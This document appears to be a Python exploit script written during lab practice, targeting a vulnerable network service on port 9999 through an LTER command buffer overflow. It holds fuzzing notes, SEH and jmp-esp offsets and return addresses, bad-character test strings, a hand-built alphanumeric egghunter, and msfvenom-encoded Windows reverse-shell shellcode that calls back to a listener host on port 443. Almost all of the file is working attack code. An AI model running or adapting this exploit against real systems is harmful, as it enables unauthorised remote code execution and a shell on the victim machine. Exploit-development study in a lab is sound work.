#!/usr/bin/python 
import socket
import sys
import struct

host= '192.168.103.143'
port = 9999

try:
	s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)

except:
	print "socket() failed"
	sys.exit(1)


#\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f "\x90""\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"


badchar = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f")  #remaining good char

s.connect((host,port))
#initial fuzz @ 5012 overwrote SEH, NSEH, not EIP
#6012 same as initial
#10000 same as initial
#50,000, 4000, 3800,3650
#2000,3000 3,500 overwrites EIP NO SEH
# SEH/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 6E45336E
#[*] Exact match at offset 3520

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.102.53 LPORT=443 -f python -a x86 --platform windows -b "\x00\x0a" -e x86/alpha_mixed BufferRegister=ESP
shell =  "T00WT00W"
shell =  ""
shell += "\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shell += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
shell += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
shell += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
shell += "\x39\x6c\x49\x78\x6c\x42\x67\x70\x35\x50\x53\x30\x33"
shell += "\x50\x6c\x49\x58\x65\x45\x61\x4b\x70\x62\x44\x6e\x6b"
shell += "\x76\x30\x76\x50\x6e\x6b\x31\x42\x44\x4c\x6e\x6b\x73"
shell += "\x62\x36\x74\x4c\x4b\x32\x52\x71\x38\x44\x4f\x6f\x47"
shell += "\x73\x7a\x46\x46\x50\x31\x4b\x4f\x6e\x4c\x47\x4c\x53"
shell += "\x51\x71\x6c\x77\x72\x66\x4c\x77\x50\x69\x51\x5a\x6f"
shell += "\x34\x4d\x37\x71\x7a\x67\x5a\x42\x6b\x42\x56\x32\x51"
shell += "\x47\x6e\x6b\x73\x62\x72\x30\x4e\x6b\x43\x7a\x47\x4c"
shell += "\x4e\x6b\x72\x6c\x57\x61\x32\x58\x78\x63\x77\x38\x66"
shell += "\x61\x4b\x61\x70\x51\x6e\x6b\x46\x39\x65\x70\x37\x71"
shell += "\x4a\x73\x6c\x4b\x67\x39\x72\x38\x69\x73\x66\x5a\x57"
shell += "\x39\x4c\x4b\x35\x64\x4e\x6b\x37\x71\x6a\x76\x45\x61"
shell += "\x69\x6f\x4e\x4c\x39\x51\x6a\x6f\x54\x4d\x35\x51\x69"
shell += "\x57\x64\x78\x6b\x50\x30\x75\x6c\x36\x45\x53\x43\x4d"
shell += "\x58\x78\x77\x4b\x73\x4d\x51\x34\x73\x45\x49\x74\x76"
shell += "\x38\x4e\x6b\x50\x58\x74\x64\x63\x31\x48\x53\x50\x66"
shell += "\x6e\x6b\x46\x6c\x32\x6b\x6c\x4b\x51\x48\x55\x4c\x76"
shell += "\x61\x4b\x63\x6e\x6b\x64\x44\x6c\x4b\x55\x51\x68\x50"
shell += "\x6b\x39\x32\x64\x51\x34\x75\x74\x53\x6b\x43\x6b\x61"
shell += "\x71\x31\x49\x51\x4a\x72\x71\x4b\x4f\x49\x70\x63\x6f"
shell += "\x51\x4f\x53\x6a\x4c\x4b\x54\x52\x68\x6b\x4c\x4d\x71"
shell += "\x4d\x45\x38\x56\x53\x56\x52\x47\x70\x63\x30\x73\x58"
shell += "\x32\x57\x32\x53\x50\x32\x43\x6f\x30\x54\x35\x38\x72"
shell += "\x6c\x42\x57\x47\x56\x37\x77\x59\x6f\x6a\x75\x38\x38"
shell += "\x7a\x30\x37\x71\x65\x50\x43\x30\x67\x59\x38\x44\x50"
shell += "\x54\x46\x30\x70\x68\x51\x39\x6f\x70\x30\x6b\x35\x50"
shell += "\x69\x6f\x6e\x35\x50\x50\x70\x50\x70\x50\x62\x70\x53"
shell += "\x70\x42\x70\x77\x30\x42\x70\x65\x38\x38\x6a\x36\x6f"
shell += "\x79\x4f\x4d\x30\x69\x6f\x38\x55\x7a\x37\x71\x7a\x56"
shell += "\x65\x43\x58\x59\x50\x59\x38\x75\x36\x50\x35\x73\x58"
shell += "\x67\x72\x73\x30\x33\x31\x4d\x6b\x6d\x59\x59\x76\x62"
shell += "\x4a\x72\x30\x53\x66\x36\x37\x45\x38\x6e\x79\x4d\x75"
shell += "\x74\x34\x30\x61\x49\x6f\x78\x55\x6c\x45\x6b\x70\x62"
shell += "\x54\x66\x6c\x69\x6f\x72\x6e\x37\x78\x61\x65\x38\x6c"
shell += "\x50\x68\x78\x70\x68\x35\x4c\x62\x52\x76\x69\x6f\x4b"
shell += "\x65\x31\x78\x43\x53\x32\x4d\x70\x64\x57\x70\x6e\x69"
shell += "\x79\x73\x36\x37\x61\x47\x50\x57\x30\x31\x4c\x36\x62"
shell += "\x4a\x54\x52\x61\x49\x53\x66\x49\x72\x49\x6d\x33\x56"
shell += "\x38\x47\x57\x34\x57\x54\x67\x4c\x36\x61\x53\x31\x6e"
shell += "\x6d\x42\x64\x54\x64\x46\x70\x6f\x36\x37\x70\x62\x64"
shell += "\x71\x44\x42\x70\x51\x46\x31\x46\x32\x76\x63\x76\x32"
shell += "\x76\x62\x6e\x63\x66\x70\x56\x71\x43\x70\x56\x52\x48"
shell += "\x54\x39\x68\x4c\x45\x6f\x6c\x46\x39\x6f\x68\x55\x6f"
shell += "\x79\x4b\x50\x30\x4e\x70\x56\x51\x56\x49\x6f\x56\x50"
shell += "\x61\x78\x47\x78\x6b\x37\x57\x6d\x71\x70\x6b\x4f\x6a"
shell += "\x75\x6f\x4b\x7a\x50\x6f\x45\x4d\x72\x52\x76\x72\x48"
shell += "\x4d\x76\x6e\x75\x4d\x6d\x6f\x6d\x6b\x4f\x78\x55\x55"
shell += "\x6c\x76\x66\x33\x4c\x66\x6a\x6d\x50\x49\x6b\x69\x70"
shell += "\x64\x35\x44\x45\x4d\x6b\x30\x47\x36\x73\x50\x72\x52"
shell += "\x4f\x53\x5a\x33\x30\x66\x33\x69\x6f\x4b\x65\x41\x41"


egghunter = "\x25\x4A\x4D\x4E\x55" # AND EAX,554E4D4A 
egghunter += "\x25\x35\x32\x31\x2A" # AND EAX,2A313235
		

egghunter += "\x54" # PUSH ESP
egghunter += "\x58" # POP EAX
egghunter += "\x2d\x66\x4D\x55\x55" # SUB EAX,55554D66
egghunter += "\x2d\x66\x4B\x55\x55" # SUB EAX,55554B66
egghunter += "\x2d\x6A\x50\x55\x55" # SUB EAX,5555506A
egghunter += "\x50" # PUSH EAX
egghunter += "\x5C" # POP ESP


egghunter += "\x25\x4A\x4D\x4E\x55" # AND EAX,554E4D4A 
egghunter += "\x25\x35\x32\x31\x2A" # AND EAX,2A313235
		
egghunter += "\x2D\x06\x01\x41\x01" # SUB EAX,01410106
egghunter += "\x2D\x06\x01\x41\x01" # SUB EAX,01410106
egghunter += "\x2D\x7f\x16\x7e\x15" # SUB EAX,157e167f
egghunter += "\x50" # PUSH EAX
egghunter += "\x41\x41" # INC ECX; INC ECX;

egghunter += "\x25\x4A\x4D\x4E\x55" # AND EAX,554E4D4A 
egghunter += "\x25\x35\x32\x31\x2A" # AND EAX,2A313235
		
egghunter += "\x2D\x01\x06\x01\x01" # SUB EAX,01010601
egghunter += "\x2D\x01\x06\x01\x01" # SUB EAX,01010601
egghunter += "\x2D\x4f\x7e\x13\x4e" # SUB EAX,4e137e4f
egghunter += "\x50" # PUSH EAX
egghunter += "\x41\x41" # INC ECX; INC ECX;

egghunter += "\x25\x4A\x4D\x4E\x55" # AND EAX,554E4D4A 
egghunter += "\x25\x35\x32\x31\x2A" # AND EAX,2A313235
		
egghunter += "\x2D\x29\x15\x01\x01" # SUB EAX,01011529
egghunter += "\x2D\x29\x15\x01\x01" # SUB EAX,01011529
egghunter += "\x2D\x7e\x7e\x72\x03" # SUB EAX,03727e7e
egghunter += "\x50" # PUSH EAX
egghunter += "\x41\x41" # INC ECX; INC ECX;

egghunter += "\x25\x4A\x4D\x4E\x55" # AND EAX,554E4D4A 
egghunter += "\x25\x35\x32\x31\x2A" # AND EAX,2A313235
		
egghunter += "\x2D\x01\x01\x16\x28" # SUB EAX,28160101
egghunter += "\x2D\x01\x01\x16\x28" # SUB EAX,28160101
egghunter += "\x2D\x0f\x45\x7f\x7f" # SUB EAX,7f7f450f
egghunter += "\x50" # PUSH EAX
egghunter += "\x41\x41" # INC ECX; INC ECX;

egghunter += "\x25\x4A\x4D\x4E\x55" # AND EAX,554E4D4A 
egghunter += "\x25\x35\x32\x31\x2A" # AND EAX,2A313235
		
egghunter += "\x2D\x23\x3e\x13\x06" # SUB EAX,06133e23
egghunter += "\x2D\x23\x3e\x13\x06" # SUB EAX,06133e23
egghunter += "\x2D\x7e\x7e\x7f\x7f" # SUB EAX,7f7f7e7e
egghunter += "\x50" # PUSH EAX
egghunter += "\x41\x41" # INC ECX; INC ECX;

egghunter += "\x25\x4A\x4D\x4E\x55" # AND EAX,554E4D4A 
egghunter += "\x25\x35\x32\x31\x2A" # AND EAX,2A313235
		
egghunter += "\x2D\x40\x14\x01\x29" # SUB EAX,29011440
egghunter += "\x2D\x40\x14\x01\x29" # SUB EAX,29011440
egghunter += "\x2D\x7e\x7f\x30\x7f" # SUB EAX,7f307f7e
egghunter += "\x50" # PUSH EAX
egghunter += "\x41\x41" # INC ECX; INC ECX;

egghunter += "\x25\x4A\x4D\x4E\x55" # AND EAX,554E4D4A 
egghunter += "\x25\x35\x32\x31\x2A" # AND EAX,2A313235
		
egghunter += "\x2D\x39\x1f\x17\x0b" # SUB EAX,0b171f39
egghunter += "\x2D\x39\x1f\x17\x0b" # SUB EAX,0b171f39
egghunter += "\x2D\x7f\x7f\x7f\x7f" # SUB EAX,7f7f7f7f
egghunter += "\x50" # PUSH EAX
egghunter += "\x41\x41" # INC ECX; INC ECX;

egghunter += "\x25\x4A\x4D\x4E\x55" # AND EAX,554E4D4A 
egghunter += "\x25\x35\x32\x31\x2A" # AND EAX,2A313235
		
egghunter += "\x2D\x0e\x01\x01\x41" # SUB EAX,4101010e
egghunter += "\x2D\x0e\x01\x01\x41" # SUB EAX,4101010e
egghunter += "\x2D\x7e\x7c\x33\x7e" # SUB EAX,7e337c7e
egghunter += "\x50" # PUSH EAX
egghunter += "\x41\x41" # INC ECX; INC ECX;


#crash ="LTER /.:"+"\x41" * 3600 #6012#5012
pre="LTER /.:"
#crash=pre+"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9"
crash =pre + "A"*3520+"B"*4
nseh="CCCC"
#seh="BBBB"
#pop pop ret 6250172B  625010B4

seh="\x2b\x17\x50\x62"
nseh="\x71\x08\x70\x08" #jmping 7F because cahractrs over 80 are managled

#81ECC8000000      sub esp,0xc8 (200)

crash=pre+ "\x41"*(3520-len(nseh))+nseh+seh+"B"*(3600)#-3520-len(seh))
jmpesp="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"
#crash=pre+"\x41"*(1876)+"\x42"*(4)+"\x43"*(2)+"\x44"*(118)
jmpesp="\x03\x12\x50\x62" #62501203
crash=pre+"\x41"*(1876)+jmpesp+"\x43"*(2)+"\x44"*(118)
#crash=pre+"\x41"*(3000)
crash=pre+"\x41"*(2004)+jmpesp+shell
#"\x41"*(2000)

badchars = ("W0T"+"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
#crash=pre+badchars+"A"*(3520-len(badchars))

#commands=['RTIME','Ltime','srun','trun','gmon','gdog','gter','hter','lter','kstan'] #removed kstat as that seems to have a very small b uuffer, stats as resutls oin priv instruction
s.recv(1024)
commands=['GDOG']
#for cmd in commands:
	#s.send(cmd+" "+shell)
	#print (cmd+" "+shell)
	#s.recv(1024)



#crash=pre+badchar+"A"*(3520-len(badchar))

#s.recv(1024)
s.send(crash)



s.close()

